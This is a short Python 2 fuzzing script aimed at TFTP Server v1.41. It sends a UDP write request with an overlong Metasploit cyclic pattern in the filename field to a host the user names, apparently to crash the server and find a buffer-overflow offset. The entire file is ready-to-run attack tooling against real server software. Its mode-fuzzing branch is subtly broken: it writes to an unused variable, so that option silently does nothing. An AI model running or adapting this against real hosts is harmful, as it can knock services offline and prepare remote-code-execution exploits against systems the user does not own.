#!/usr/bin/env python

##############################
# TFTP Server v1.41 Fuzzer
##############################

import socket
import argparse
import subprocess

## Argument Parser
parser = argparse.ArgumentParser()
parser.add_argument("-t", "--target", action="store", dest="target", type=str,
                    help="Target host", required=True)
parser.add_argument("-p", "--port", action="store", dest="port", type=str,
                    help="Target UDP port (default 69)", default=69)
parser.add_argument("-i", "--iterations", action="store", dest="iterations", type=int,
                    help="Number of characters to fuzz", default=1000)
parser.add_argument("-f", "--field", action="store", dest="field", type=str,
                    help="Field to fuzz; default is filename", default="filename")
args = parser.parse_args()

## Payload Processing
header = "\x00\x01"

try:
    p = subprocess.Popen(["msf-pattern_create","-s","ABCDEFGHIJKLMNOP,abcdefghijklmnop,123456789","-l",str(args.iterations)], stdout=subprocess.PIPE)
except OSError:
    print("Error: msf-pattern_create not in system path... fuzzing with 'A' characters")
    fuzz = "A" * args.iterations
else:
    fuzz = p.communicate()[0]

filename = "test"
mode = "mail"
payload = ""

if args.field == "filename":
    filename = fuzz
elif args.field == "mode":
    field = fuzz;
else:
    print("Invalid field: " + args.field)

print("Fuzzing " + args.field + " for " + str(args.iterations) + " characters")
payload += header
payload += filename + "\x00"
payload += mode + "\x00"
print(payload.encode('hex_codec'))

## Establish UDP Socket
socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
socket.sendto(payload,(args.target,args.port))
